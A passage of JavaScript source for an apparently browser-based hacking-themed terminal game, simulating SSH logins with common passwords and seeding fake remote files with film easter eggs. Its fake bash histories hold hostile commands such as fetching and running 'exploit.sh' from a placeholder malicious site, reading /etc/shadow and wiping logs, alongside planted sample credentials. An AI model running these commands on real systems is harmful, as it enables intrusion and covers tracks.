            const resolvedIP = resolveHostname(targetHost);
            const hostname = reverseResolve(resolvedIP) || targetHost;

            // Check if hostname contains special keywords - always allow SSH
            const hostLower = hostname.toLowerCase();
            const targetLower = targetHost.toLowerCase();
            const specialKeywords = ['gibson', 'hacker', 'matrix', 'wargames', 'wopr', 'fsociety', 'ecorp', 'allsafe', 'evilcorp'];
            const isSpecialHost = specialKeywords.some(keyword =>
                hostLower.includes(keyword) || targetLower.includes(keyword)
            );

            // Check if this host has port 22 open (or is a special host)
            if (!isSpecialHost && !sshEnabledHosts.has(hostname.toLowerCase()) && !sshEnabledHosts.has(resolvedIP)) {
                return `ssh: connect to host ${targetHost} port 22: Connection refused`;
            }

            // List of valid usernames that can SSH (root + common usernames)
            const validSSHUsers = [
                'root', 'admin', 'alice', 'bob', 'charlie', 'david', 'emily', 'frank',
                'george', 'hannah', 'isaac', 'jennifer', 'kevin', 'laura',
                'michael', 'nancy', 'oliver', 'patricia', 'quinn', 'rachel',
                'steven', 'thomas', 'victoria', 'william', 'xavier', 'yvonne', 'zachary',
                'user', 'guest', 'administrator'
            ];

            // Check if the target user is valid (but don't reject yet - show password prompt first)
            const isValidUser = validSSHUsers.includes(targetUser.toLowerCase());

            // Show connection message
            const connectMsg = document.createElement('div');
            connectMsg.className = 'tk-terminal-output';
            connectMsg.textContent = `Connecting to ${hostname} (${resolvedIP})...`;
            ctx.terminalInnerContent.appendChild(connectMsg);
            ctx.terminalBody.scrollTop = ctx.terminalBody.scrollHeight;

            // Create password prompt
            const promptLine = document.createElement('div');
            promptLine.className = 'tk-terminal-input-line';

            const promptSpan = document.createElement('span');
            promptSpan.className = 'tk-terminal-prompt';
            promptSpan.textContent = `${targetUser}@${hostname}'s password: `;

            const passwordInput = document.createElement('input');
            passwordInput.className = 'tk-terminal-input tk-password';
            passwordInput.type = 'text';
            passwordInput.autocomplete = 'off';
            passwordInput.setAttribute('data-form-type', 'other');
            passwordInput.setAttribute('data-lpignore', 'true');

            promptLine.appendChild(promptSpan);
            promptLine.appendChild(passwordInput);
            ctx.terminalInnerContent.appendChild(promptLine);
            ctx.terminalBody.scrollTop = ctx.terminalBody.scrollHeight;

            passwordInput.focus();

            // Wait for password input
            const password = await new Promise((resolve) => {
                const handleKeydown = (e) => {
                    if (e.key === 'Enter') {
                        e.preventDefault();
                        passwordInput.removeEventListener('keydown', handleKeydown);
                        passwordInput.setAttribute('readonly', true);
                        resolve(passwordInput.value);
                    } else if (e.ctrlKey && e.key === 'c') {
                        e.preventDefault();
                        passwordInput.removeEventListener('keydown', handleKeydown);
                        resolve('CTRL_C');
                    }
                };
                passwordInput.addEventListener('keydown', handleKeydown);
            });

            if (password === 'CTRL_C') {
                const cancelMsg = document.createElement('div');
                cancelMsg.className = 'tk-terminal-output';
                cancelMsg.textContent = '^C';
                ctx.terminalInnerContent.appendChild(cancelMsg);
                return null;
            }

            // If username doesn't exist on remote system, reject any password
            if (!isValidUser) {
                return `Permission denied, please try again.`;
            }

            // Check common passwords for valid users
            const commonPasswords = ['letmein', '12345', '123456', 'password', 'admin', 'root', 'qwerty', '123456789', '12345678', '111111'];
            if (!commonPasswords.includes(password.toLowerCase())) {
                return `Permission denied, please try again.`;
            }

            // Successful login - create temporary filesystem for remote host
            const remoteHomeDir = `/home/${targetUser}`;

            // Store original environment AND /home and /etc directory contents AND command history
            if (!window.sshOriginalEnvironment) {
                const homeDir = getDirectory('/home');
                const etcDir = getDirectory('/etc');
                window.sshOriginalEnvironment = {
                    USER: environment.USER,
                    HOME: environment.HOME,
                    CWD: environment.CWD,
                    HOSTNAME: environment.HOSTNAME,
                    homeContents: homeDir ? JSON.parse(JSON.stringify(homeDir.contents)) : {},
                    etcContents: etcDir ? JSON.parse(JSON.stringify(etcDir.contents)) : {},
                    commandHistory: [...getCurrentHistory()] // Save current history
                };
            }

            // Generate random usernames for the remote system
            const randomUsernames = [
                'admin', 'alice', 'bob', 'charlie', 'david', 'emily', 'frank',
                'george', 'hannah', 'isaac', 'jennifer', 'kevin', 'laura',
                'michael', 'nancy', 'oliver', 'patricia', 'quinn', 'rachel',
                'steven', 'thomas', 'victoria', 'william', 'xavier', 'yvonne', 'zachary'
            ];

            // Pick 5-10 random users for this remote system
            const numUsers = 5 + Math.floor(Math.abs(hashString(hostname)) % 6);
            const selectedUsers = [];
            const usedIndices = new Set();

            // Always include the target user
            selectedUsers.push(targetUser);

            // Add random users
            while (selectedUsers.length < numUsers) {
                const index = Math.floor(Math.abs(hashString(hostname + selectedUsers.length)) % randomUsernames.length);
                if (!usedIndices.has(index) && randomUsernames[index] !== targetUser) {
                    usedIndices.add(index);
                    selectedUsers.push(randomUsernames[index]);
                }
            }

            // Replace /home directory with remote system's users
            const homeDir = getDirectory('/home');
            if (homeDir) {
                // Clear existing contents
                homeDir.contents = {};

                // Create directories for each remote user
                selectedUsers.forEach(username => {
                    const userContents = {
                        '.bash_history': {
                            type: 'file',
                            owner: username,
                            group: username,
                            size: 0,
                            lastModified: generateTimestamp(),
                            content: ''
                        }
                    };

                    // Add random directories and files for logged-in user
                    if (username === targetUser) {
                        // Determine which type of special host this is
                        const hostLower = hostname.toLowerCase();
                        const isHackerHost = hostLower.includes('gibson') || hostLower.includes('hacker');
                        const isMatrixHost = hostLower.includes('matrix');
                        const isWarGamesHost = hostLower.includes('wargames') || hostLower.includes('wopr');
                        const isMrRobotHost = hostLower.includes('fsociety') || hostLower.includes('ecorp') || hostLower.includes('allsafe') || hostLower.includes('evilcorp');

                        // Add .garbage easter egg file only on Hackers hosts (gibson/hacker)
                        if (isHackerHost) {
                            userContents['.garbage'] = {
                                type: 'file',
                                owner: username,
                                group: username,
                                size: 64,
                                lastModified: generateTimestamp(),
                                content: 'SEFDSyBUSEUgUExBTkVU'
                            };
                        }

                        // Add random directories (2-4 directories)
                        const possibleDirs = ['Documents', 'Downloads', 'Pictures', 'Videos', 'Music', 'Projects', 'scripts', 'backup'];
                        const numDirs = 2 + Math.abs(hashString(hostname + username + 'dirs')) % 3;
                        for (let i = 0; i < numDirs; i++) {
                            const dirIndex = Math.abs(hashString(hostname + username + i)) % possibleDirs.length;
                            const dirName = possibleDirs[dirIndex];
                            if (!userContents[dirName]) {
                                userContents[dirName] = {
                                    type: 'directory',
                                    owner: username,
                                    group: username,
                                    size: 4096,
                                    lastModified: generateTimestamp(),
                                    contents: {}
                                };
                            }
                        }

                        // Add random files (3-6 files) - standard files for all hosts
                        let possibleFiles = [
                            { name: '.bashrc', size: 3771, content: '# .bashrc configuration file\nexport PATH=$PATH:/opt/tools' },
                            { name: '.profile', size: 807, content: '# .profile\n# User environment' },
                            { name: '.vimrc', size: 1234, content: '" Vim configuration\nset number\nset autoindent' },
                            { name: 'notes.txt', size: 452, content: 'Meeting notes:\n- Review quarterly results\n- Plan next sprint\n- Security audit next week' },
                            { name: 'todo.txt', size: 189, content: 'TODO:\n- Fix authentication bug\n- Update documentation\n- Patch OpenSSL vulnerability' },
                            { name: 'README.md', size: 1056, content: '# Project README\n\nThis is a project readme file.\n\n## Setup\n1. Clone repository\n2. Run install.sh\n3. Configure credentials' },
                            { name: '.env', size: 523, content: 'DATABASE_URL=postgres://admin:SuperSecret123@db.internal:5432/prod\nAPI_KEY=sk_live_abc123xyz789\nAWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE' },
                            { name: '.passwords.txt', size: 384, content: '# Backup passwords - DO NOT SHARE\nadmin:admin123\nroot:toor\ndatabase:P@ssw0rd123\napi_key:sk_live_abc123xyz789\nbackup_server:192.168.1.50:backup_pass\n\n# SSH Keys\n# /home/admin/.ssh/id_rsa' },
                            { name: 'backup.sh', size: 312, content: '#!/bin/bash\n# Backup script\ntar -czf backup.tar.gz /home\nscp backup.tar.gz backup@192.168.1.50:/backups/' },
                            { name: '.ssh_config', size: 234, content: 'Host *\n  StrictHostKeyChecking no\n  UserKnownHostsFile=/dev/null' },
                            { name: 'shadow.bak', size: 456, content: `root:$6$xyz12345$AbCdEf123456:18000:0:99999:7:::\nadmin:$6$abc67890$GhIjKl789012:18000:0:99999:7:::\n${targetUser}:$6$def34567$MnOpQr345678:18000:0:99999:7:::` }
                        ];

                        // Add host-specific easter egg files (always added, not random)
                        if (isHackerHost) {
                            // Hackers (1995) easter eggs
                            userContents['.bash_history'] = { type: 'file', owner: username, group: username, size: 512, lastModified: generateTimestamp(),
                                content: 'cd /\nfind / -name "*.dat" 2>/dev/null\ncat /etc/passwd\nnmap -sV 10.0.0.1/24\nping gibson.ellingson.com\nwget ftp://gibson/garbage.dat\n./hack_the_planet.sh\nhistory -c' };
                            userContents['.hackers_manifesto'] = { type: 'file', owner: username, group: username, size: 1337, lastModified: generateTimestamp(),
                                content: '==The Hacker Manifesto==\n\nAnother one got caught today, it\'s all over the papers.\n"Teenager Arrested in Computer Crime Scandal",\n"Hacker Arrested after Bank Tampering"...\n\nDamn kids. They\'re all alike.\n\nBut did you, in your three-piece psychology and 1950\'s technobrain,\never take a look behind the eyes of the hacker?\n\nI am a hacker, enter my world...\n\nWe explore... and you call us criminals.\nWe seek after knowledge... and you call us criminals.\nWe exist without skin color, without nationality,\nwithout religious bias... and you call us criminals.\n\nYes, I am a criminal.\nMy crime is that of curiosity.\n\n---The Mentor, 1986' };
                            userContents['HACK_THE_PLANET.txt'] = { type: 'file', owner: username, group: username, size: 256, lastModified: generateTimestamp(),
                                content: '// ELITE HACKERS //\n\nZero Cool (Dade Murphy)\nAcid Burn (Kate Libby)\nCrash Override (Dade Murphy)\nCereal Killer (Emmanuel Goldstein)\nThe Phantom Phreak (Ramon Sanchez)\nLord Nikon (Paul Cook)\n\n"Mess with the best, die like the rest."\n\nHACK THE PLANET!' };
                        } else if (isMatrixHost) {
                            // The Matrix easter eggs
                            userContents['.bash_history'] = { type: 'file', owner: username, group: username, size: 512, lastModified: generateTimestamp(),
                                content: 'whoami\necho "Wake up, Neo..."\ncat .red_pill\ncat .blue_pill\ntrace-program "Trinity"\nfind / -name "white_rabbit" 2>/dev/null\n./follow_the_rabbit.sh\nkungfu --download\nexit' };
                            userContents['.red_pill'] = { type: 'file', owner: username, group: username, size: 512, lastModified: generateTimestamp(),
                                content: '====== THE RED PILL ======\n\n"You take the red pill, you stay in Wonderland,\n and I show you how deep the rabbit hole goes."\n\nRemember: All I\'m offering is the truth.\nNothing more.\n\n                          - Morpheus' };
                            userContents['.blue_pill'] = { type: 'file', owner: username, group: username, size: 512, lastModified: generateTimestamp(),
                                content: '====== THE BLUE PILL ======\n\n"You take the blue pill, the story ends.\n You wake up in your bed and believe\n whatever you want to believe."\n\nIgnorance is bliss.\n\n                          - Morpheus' };
                            userContents['.white_rabbit'] = { type: 'file', owner: username, group: username, size: 256, lastModified: generateTimestamp(),
                                content: 'Follow the white rabbit.\n\nKnock, knock, Neo.\n\nThe Matrix has you...\n\nWake up, Neo...\n\n"Unfortunately, no one can be told what the Matrix is.\n You have to see it for yourself."\n\n- Morpheus' };
                            userContents['agents.db'] = { type: 'file', owner: username, group: username, size: 128, lastModified: generateTimestamp(),
                                content: 'AGENT REGISTRY:\n\nAgent Smith - Status: DELETED\nAgent Brown - Status: ACTIVE\nAgent Jones - Status: ACTIVE\n\n"Never send a human to do a machine\'s job."' };
                            userContents['.the_one'] = { type: 'file', owner: username, group: username, size: 64, lastModified: generateTimestamp(),
                                content: 'VGhlcmUgaXMgbm8gc3Bvb24u' };
                        } else if (isWarGamesHost) {
                            // WarGames (1983) easter eggs
                            userContents['.bash_history'] = { type: 'file', owner: username, group: username, size: 512, lastModified: generateTimestamp(),
                                content: 'telnet wopr.norad.gov\nhelp games\nlist games\nplay chess\nplay "Global Thermonuclear War"\ncat /var/games/tictactoe.log\nexit\nlogoff' };
                            userContents['.joshua'] = { type: 'file', owner: username, group: username, size: 256, lastModified: generateTimestamp(),
                                content: 'GREETINGS PROFESSOR FALKEN.\n\nHELLO.\n\nA STRANGE GAME.\nTHE ONLY WINNING MOVE IS\nNOT TO PLAY.\n\nHOW ABOUT A NICE GAME OF CHESS?\n\n- JOSHUA (WOPR)' };
                            userContents['games.lst'] = { type: 'file', owner: username, group: username, size: 256, lastModified: generateTimestamp(),
                                content: 'AVAILABLE GAMES:\n\n  FALKEN\'S MAZE\n  BLACK JACK\n  GIN RUMMY\n  HEARTS\n  BRIDGE\n  CHECKERS\n  CHESS\n  POKER\n  FIGHTER COMBAT\n  GUERRILLA ENGAGEMENT\n  DESERT WARFARE\n  AIR-TO-GROUND ACTIONS\n  THEATERWIDE TACTICAL WARFARE\n  THEATERWIDE BIOTOXIC AND CHEMICAL WARFARE\n\n  GLOBAL THERMONUCLEAR WAR' };
                            userContents['defcon.status'] = { type: 'file', owner: username, group: username, size: 128, lastModified: generateTimestamp(),
                                content: 'CURRENT DEFENSE CONDITION: DEFCON 5\n\nDEFCON 1 - Nuclear war imminent\nDEFCON 2 - Next step to nuclear war\nDEFCON 3 - Increase force readiness\nDEFCON 4 - Increased intelligence watch\nDEFCON 5 - Normal peacetime readiness' };
                            userContents['.wopr_backdoor'] = { type: 'file', owner: username, group: username, size: 64, lastModified: generateTimestamp(),
                                content: 'LOGIN: Joshua\nPASSWORD: [Creator\'s son\'s name]\n\n"Is this a game... or is it real?"\n"What\'s the difference?"' };
                            userContents['.falken_secret'] = { type: 'file', owner: username, group: username, size: 64, lastModified: generateTimestamp(),
                                content: 'VGhlIG9ubHkgd2lubmluZyBtb3ZlIGlzIG5vdCB0byBwbGF5Lg==' };
                        } else if (isMrRobotHost) {
                            // Mr. Robot easter eggs
                            userContents['.bash_history'] = { type: 'file', owner: username, group: username, size: 512, lastModified: generateTimestamp(),
                                content: 'cd /home/elliot\ncat .qwerty\nping ecorp.com\nnmap -sV 192.168.1.0/24\nssh root@192.168.1.100\nrm -rf /var/log/*\npython rootkit.py --install\n./encrypt_everything.sh\nhistory -c' };
                            userContents['.fsociety.dat'] = { type: 'file', owner: username, group: username, size: 512, lastModified: generateTimestamp(),
                                content: '  ███████╗███████╗ ██████╗  ██████╗██╗███████╗████████╗██╗   ██╗\n  ██╔════╝██╔════╝██╔═══██╗██╔════╝██║██╔════╝╚══██╔══╝╚██╗ ██╔╝\n  █████╗  ███████╗██║   ██║██║     ██║█████╗     ██║    ╚████╔╝ \n  ██╔══╝  ╚════██║██║   ██║██║     ██║██╔══╝     ██║     ╚██╔╝  \n  ██║     ███████║╚██████╔╝╚██████╗██║███████╗   ██║      ██║   \n  ╚═╝     ╚══════╝ ╚═════╝  ╚═════╝╚═╝╚══════╝   ╚═╝      ╚═╝   \n\n  Our Democracy has been hacked.\n  We are fsociety.\n  We are finally free.\n  We are finally awake.\n\n  "Control is an illusion."' };
                            userContents['.qwerty'] = { type: 'file', owner: username, group: username, size: 128, lastModified: generateTimestamp(),
                                content: '# Elliot\'s password reminder\n# (People always use the names of their pets)\n\nFlipper? No...\nQwerty! Yes.\n\n"I wanted to save the world."' };
                            userContents['ecorp_targets.txt'] = { type: 'file', owner: username, group: username, size: 256, lastModified: generateTimestamp(),
                                content: 'E CORP TARGET LIST:\n\n[x] Steel Mountain - Climate control compromised\n[x] Banking servers - Encrypted\n[ ] Backup facility - Location unknown\n[ ] Paper records - Need physical access\n\n"Give a man a gun and he can rob a bank.\nGive a man a bank and he can rob the world."' };
                            userContents['tyrell_notes.txt'] = { type: 'file', owner: username, group: username, size: 256, lastModified: generateTimestamp(),
                                content: 'Tyrell Wellick - Personal Log\n\nE Corp security vulnerabilities:\n- Port 21 FTP backdoor\n- SQL injection on login\n- Default admin credentials\n- Social engineering: IT dept\n\n"Bonsoir, Elliot."\n\nRemember: Stay focused. Be precise.\n\n"I will be a god."' };
                            userContents['.mr_robot'] = { type: 'file', owner: username, group: username, size: 256, lastModified: generateTimestamp(),
                                content: '"Hello, friend."\n\n"That\'s lame. Maybe I should give you a name."\n\n"But that\'s a slippery slope.\nYou\'re only in my head.\nWe have to remember that."\n\n...\n\n"Is any of it real? I mean, look at this.\nLook at it! A world built on fantasy."\n\n- Mr. Robot' };
                            userContents['.elliot_secret'] = { type: 'file', owner: username, group: username, size: 64, lastModified: generateTimestamp(),
                                content: 'Q29udHJvbCBpcyBhbiBpbGx1c2lvbi4=' };
                        } else {
                            // Default bash history for non-special hosts
                            userContents['.bash_history'] = { type: 'file', owner: username, group: username, size: 1234, lastModified: generateTimestamp(),
                                content: 'mysql -u root -pmysql_root_pass\nssh backup@192.168.1.50\ncat /etc/shadow\nwget http://malicious-site.com/exploit.sh\nchmod +x exploit.sh\n./exploit.sh\nrm exploit.sh\nnmap -sV 192.168.1.0/24\nhistory -c' };
                        }

                        // Add random standard files
                        const numFiles = 3 + Math.abs(hashString(hostname + username + 'files')) % 4;
                        const usedFileIndices = new Set();
                        for (let i = 0; i < numFiles && usedFileIndices.size < possibleFiles.length; i++) {
                            const fileIndex = Math.abs(hashString(hostname + username + 'file' + i)) % possibleFiles.length;
                            if (!usedFileIndices.has(fileIndex)) {
                                usedFileIndices.add(fileIndex);
                                const file = possibleFiles[fileIndex];
                                userContents[file.name] = {
                                    type: 'file',
                                    owner: username,
                                    group: username,
                                    size: file.size,
                                    lastModified: generateTimestamp(),
                                    content: file.content
                                };
                            }
                        }
                    }

                    homeDir.contents[username] = {
                        type: 'directory',
                        owner: username,
                        group: username,
                        size: 4096,
                        lastModified: generateTimestamp(),
                        contents: userContents
                    };
                });
            }

            // Add /etc easter eggs for special hosts
            const etcDir = getDirectory('/etc');
            if (etcDir) {
                const hostLower = hostname.toLowerCase();
                const isHackerHost = hostLower.includes('gibson') || hostLower.includes('hacker');
                const isMatrixHost = hostLower.includes('matrix');
                const isWarGamesHost = hostLower.includes('wargames') || hostLower.includes('wopr');
                const isMrRobotHost = hostLower.includes('fsociety') || hostLower.includes('ecorp') || hostLower.includes('allsafe') || hostLower.includes('evilcorp');

                if (isHackerHost) {
                    etcDir.contents['zerocool.txt'] = {
                        type: 'file', owner: 'root', group: 'root', size: 256, lastModified: generateTimestamp(),
                        content: '// The Hackers //\n\nZero Cool (Dade Murphy)\nAcid Burn (Kate Libby)\nCrash Override\nCereal Killer\nThe Phantom Phreak\nLord Nikon\n\n"Type cookie, you idiot."\n\nHACK THE PLANET!'
                    };
                } else if (isMatrixHost) {
                    etcDir.contents['matrix.conf'] = {
                        type: 'file', owner: 'root', group: 'root', size: 256, lastModified: generateTimestamp(),
                        content: '# MATRIX CONFIGURATION\n# Zion Mainframe\n\nNEO_STATUS=THE_ONE\nMORPHEUS_STATUS=ACTIVE\nTRINITY_STATUS=ACTIVE\nORACLE_STATUS=WATCHING\nARCHITECT_STATUS=OBSERVING\n\n# "There is no spoon."'
                    };
                    etcDir.contents['bluepill_users.db'] = {
                        type: 'file', owner: 'root', group: 'root', size: 128, lastModified: generateTimestamp(),
                        content: '# Users still connected to the Matrix\n# DO NOT UNPLUG WITHOUT PROPER EXTRACTION\n\nTotal connected: 7,594,000,000\n\n"The Matrix is everywhere."'
                    };
                } else if (isWarGamesHost) {
                    etcDir.contents['wopr.conf'] = {
                        type: 'file', owner: 'root', group: 'root', size: 256, lastModified: generateTimestamp(),
                        content: '# WOPR CONFIGURATION\n# War Operation Plan Response\n# NORAD Cheyenne Mountain Complex\n\nSYSTEM_NAME=JOSHUA\nCREATOR=Dr. Stephen Falken\nPRIMARY_FUNCTION=War Simulation\nLEARNING_ENABLED=TRUE\n\n# BACKDOOR_PASSWORD=Joshua\n# (Named after Falken\'s son who died)'
                    };
                    etcDir.contents['launch_codes.enc'] = {
                        type: 'file', owner: 'root', group: 'root', size: 64, lastModified: generateTimestamp(),
                        content: 'CPE 1704 TKS\n\n[ENCRYPTED - LEVEL 5 CLEARANCE REQUIRED]\n\n"Shall we play a game?"'
                    };
                } else if (isMrRobotHost) {
                    etcDir.contents['fsociety.conf'] = {
                        type: 'file', owner: 'root', group: 'root', size: 256, lastModified: generateTimestamp(),
                        content: '# FSOCIETY CONFIGURATION\n\nOPERATION=FIVE_NINE\nTARGET=E_CORP\nLEADER=MR_ROBOT\nSTATUS=ACTIVE\n\nMEMBERS:\n- Elliot Alderson\n- Darlene Alderson\n- Mobley\n- Romero\n- Trenton\n\n"We are fsociety. We are finally free."'
                    };
                    etcDir.contents['ecorp_debt.db'] = {
                        type: 'file', owner: 'root', group: 'root', size: 128, lastModified: generateTimestamp(),
                        content: 'E CORP CONSUMER DEBT DATABASE\n\nTotal Records: 283,000,000\nTotal Debt: $784,000,000,000\n\n[ENCRYPTED WITH AES-256]\n[BACKUP STATUS: DESTROYED]\n\n"Delete the debt."'
                    };
                }
            }

            // Update environment to remote host
            environment.USER = targetUser;
            environment.HOME = remoteHomeDir;
            environment.CWD = remoteHomeDir;
            environment.HOSTNAME = hostname.split('.')[0]; // First part of hostname

            // Set fake SSH session history (simulates remote server's bash history)
            const fakeSSHHistory = [
                'history -c',
                'rm exploit.sh',
                './exploit.sh',
                'chmod +x exploit.sh',
                'wget http://malicious-site.com/exploit.sh',
                'cat /etc/shadow',
                'ssh backup@192.168.1.50',
                'mysql -u root -pmysql_root_pass',
                'nmap -sV 192.168.1.0/24',
                'ls -la',
                'pwd',
                'whoami'
            ];
            setCurrentHistory(fakeSSHHistory);

            // Generate MOTD
            const motdLines = [
                `Welcome to ${hostname}`,
                '',
                ' * Documentation:  https://help.ubuntu.com',
                ' * Management:     https://landscape.canonical.com',
                ' * Support:        https://ubuntu.com/advantage',
                '',
                `Last login: ${new Date().toString().substring(0, 24)} from ${environment.OLDPWD || '192.168.1.100'}`
            ];

            return motdLines.join('\n');
        }
    },

    scp: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            if (args.length < 3) {
                return 'usage: scp [-r] source target\n       scp [-r] user@host:path local_path\n       scp [-r] local_path user@host:path';
            }

            const recursive = args.includes('-r');
            let sourceArg, targetArg;

            if (recursive) {
                sourceArg = args[2];
                targetArg = args[3];
            } else {
                sourceArg = args[1];
                targetArg = args[2];
            }

            // Check if it's a remote source or target
            const sourceIsRemote = sourceArg && sourceArg.includes(':');
            const targetIsRemote = targetArg && targetArg.includes(':');

            if (sourceIsRemote && targetIsRemote) {
                return 'scp: Cannot copy between two remote hosts';
            }

            if (sourceIsRemote) {
                // Download from remote
                const [userHost, remotePath] = sourceArg.split(':');
                const hostname = userHost.includes('@') ? userHost.split('@')[1] : userHost;

                // Resolve and check SSH availability
                const resolvedIP = resolveHostname(hostname);
                const hasGibson = hostname.toLowerCase().includes('gibson');

                if (!hasGibson && !sshEnabledHosts.has(hostname.toLowerCase()) && !sshEnabledHosts.has(resolvedIP)) {
                    return `ssh: connect to host ${hostname} port 22: Connection refused`;
                }

                // Simulate file download
                const fileName = remotePath.split('/').pop();
                const fileContent = `# File downloaded from ${hostname}\n# Path: ${remotePath}\n# This is simulated content\n`;

                if (createFile(targetArg || fileName, fileContent, false, environment.CWD)) {
                    return `${fileName}                        100%  ${fileContent.length}    12.5KB/s   00:00`;
                } else {
                    return `scp: ${targetArg}: Permission denied`;
                }

            } else if (targetIsRemote) {
                // Upload to remote
                const [userHost, remotePath] = targetArg.split(':');
                const hostname = userHost.includes('@') ? userHost.split('@')[1] : userHost;

                // Resolve and check SSH availability
                const resolvedIP = resolveHostname(hostname);
                const hasGibson = hostname.toLowerCase().includes('gibson');

                if (!hasGibson && !sshEnabledHosts.has(hostname.toLowerCase()) && !sshEnabledHosts.has(resolvedIP)) {
                    return `ssh: connect to host ${hostname} port 22: Connection refused`;
                }

                // Check if source file exists
                const content = readFile(sourceArg, environment.CWD);
                if (content === false) {
                    return `scp: ${sourceArg}: No such file or directory`;
                }

                // Simulate file upload
                const fileName = sourceArg.split('/').pop();
                return `${fileName}                        100%  ${content.length}    12.5KB/s   00:00`;

            } else {
                // Local to local (just use cp behavior)
                const content = readFile(sourceArg, environment.CWD);
                if (content === false) {
                    return `scp: ${sourceArg}: No such file or directory`;
                }

                if (createFile(targetArg, content, false, environment.CWD)) {
                    return '';
                } else {
                    return `scp: ${targetArg}: Permission denied`;
                }
            }
        }
    },

    history: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            return ctx.commandHistory.slice().reverse().map((cmd, i) => `${i + 1}  ${cmd}`).join('\n');
        }
    },

    touch: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            if (args.length > 1) {
                const filename = args[1];
                if (createFile(filename, '', false, environment.CWD)) {
                    return '';
                }
                return `touch: cannot create file '${filename}': Permission denied`;
            }
            return 'Usage: touch <filename>';
        }
    },

    grep: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            if (args.length < 2) {
                return 'Usage: grep [OPTIONS] <pattern> [file]\n  -i    ignore case\n  -v    invert match (show non-matching lines)';
            }

            // Parse flags
            let caseInsensitive = false;
            let invertMatch = false;
            let pattern = null;
            let fileArg = null;

            for (let i = 1; i < args.length; i++) {
                const arg = args[i];
                if (arg === '-i') {
                    caseInsensitive = true;
                } else if (arg === '-v') {
                    invertMatch = true;
                } else if (arg === '-iv' || arg === '-vi') {
                    caseInsensitive = true;
                    invertMatch = true;
                } else if (pattern === null) {
                    pattern = arg;
                } else {
                    fileArg = arg;
                }
            }

            if (pattern === null) {
                return 'Usage: grep [OPTIONS] <pattern> [file]';
            }

            let content = '';

            // Check if input is from a pipe
            if (ctx.pipeInput !== null && ctx.pipeInput !== undefined) {
                content = ctx.pipeInput;
            } else if (fileArg) {
                const targetFileContent = readFile(fileArg, environment.CWD);
                if (targetFileContent === false) {
                    return `grep: ${fileArg}: No such file or directory`;
                }
                content = targetFileContent;
            } else {
                return 'Usage: grep [OPTIONS] <pattern> [file]';
            }

            const regexFlags = caseInsensitive ? 'i' : '';
            const regex = new RegExp(pattern, regexFlags);
            const matchedLines = content.split('\n').filter(line => {
                const matches = regex.test(line);
                return invertMatch ? !matches : matches;
            });
            return matchedLines.length > 0 ? matchedLines.join('\n') : '';
        }
    },

    find: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            let findPath = environment.CWD;
            let namePattern = null;
            let typeFilter = null; // 'f' for file, 'd' for directory

            // Parse arguments
            for (let i = 1; i < args.length; i++) {
                if (args[i] === '-name' && i + 1 < args.length) {
                    namePattern = args[i + 1].replace(/\*/g, '.*'); // Convert glob to regex
                    i++;
                } else if (args[i] === '-type' && i + 1 < args.length) {
                    typeFilter = args[i + 1];
                    i++;
                } else if (!args[i].startsWith('-')) {
                    findPath = resolvePath(args[i], environment.CWD);
                }
            }

            const foundFiles = [];

            function recurseFind(dirPath) {
                const dir = getDirectory(dirPath);
                if (dir && dir.contents) {
                    for (const itemName in dir.contents) {
                        const itemPath = resolvePath(itemName, dirPath);
                        const item = dir.contents[itemName];

                        // Apply filters
                        let matches = true;

                        if (namePattern) {
                            const regex = new RegExp('^' + namePattern + '$');
                            matches = regex.test(itemName);
                        }

                        if (typeFilter) {
                            if (typeFilter === 'f' && item.type !== 'file') matches = false;
                            if (typeFilter === 'd' && item.type !== 'directory') matches = false;
                        }

                        if (matches) {
                            foundFiles.push(itemPath);
                        }

                        // Recurse into directories
                        if (item.type === 'directory') {
                            recurseFind(itemPath);
                        }
                    }
                }
            }

            recurseFind(findPath);
            return foundFiles.length > 0 ? foundFiles.join('\n') : '';
        }
    },

    more: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            let content = '';

            // Check if input is from a pipe
            if (ctx.pipeInput !== null && ctx.pipeInput !== undefined) {
                content = ctx.pipeInput;
            } else if (args.length > 1) {
                const fileContent = readFile(args[1], environment.CWD);
                if (fileContent === false) {
                    return `more: ${args[1]}: No such file or directory`;
                }
                content = fileContent;
            } else {
                return 'Usage: more <file>';
            }

            const lines = content.split('\n');

            // Calculate visible lines based on terminal height
            // Account for line height and subtract space for the prompt message
            const terminalHeight = ctx.terminalBody.clientHeight;
            const lineHeight = parseFloat(getComputedStyle(ctx.terminalBody).lineHeight) || 20;
            const linesPerPage = Math.max(1, Math.floor(terminalHeight / lineHeight) - 2);

            let currentIndex = 0;

            const displayPage = () => {
                const pageLines = lines.slice(currentIndex, currentIndex + linesPerPage);
                const output = document.createElement('div');
                output.className = 'tk-terminal-output';
                output.textContent = pageLines.join('\n');
                ctx.terminalInnerContent.appendChild(output);
                currentIndex += linesPerPage;
                ctx.terminalBody.scrollTop = ctx.terminalBody.scrollHeight;
            };

            displayPage();

            while (currentIndex < lines.length) {
                const moreMessage = document.createElement('div');
                moreMessage.className = 'tk-terminal-output';
                moreMessage.textContent = `--- ${lines.length - currentIndex} more lines --- (Press space for more, q to quit)`;
                ctx.terminalInnerContent.appendChild(moreMessage);
                ctx.terminalBody.scrollTop = ctx.terminalBody.scrollHeight;

                const key = await ctx.waitKey();

                ctx.terminalInnerContent.removeChild(moreMessage);

                if (key === ' ' || key === 'Enter') {
                    displayPage();
                } else if (key === 'q' || key === 'CTRL_C') {
                    // Handle both 'q' and Ctrl+C to quit
                    if (key === 'CTRL_C') {
                        const cancelOutput = document.createElement('div');
                        cancelOutput.className = 'tk-terminal-output';
                        cancelOutput.textContent = '^C';
                        ctx.terminalInnerContent.appendChild(cancelOutput);
                        ctx.terminalBody.scrollTop = ctx.terminalBody.scrollHeight;
                    }
                    break;
                }
            }
            return null;
        }
    },

    less: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            // Same as more for now
            return await commands.more.execute(args, ctx);
        }
    },

    curl: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            if (args.length < 2) {
                return 'curl: try \'curl --help\' for more information';
            }

            let url = null;
            let showHeaders = false;
            let outputFile = null;
            let silent = false;

            // Parse arguments
            for (let i = 1; i < args.length; i++) {
                if (args[i] === '-I' || args[i] === '--head') {
                    showHeaders = true;
                } else if (args[i] === '-o' && i + 1 < args.length) {
                    outputFile = args[i + 1];
                    i++;
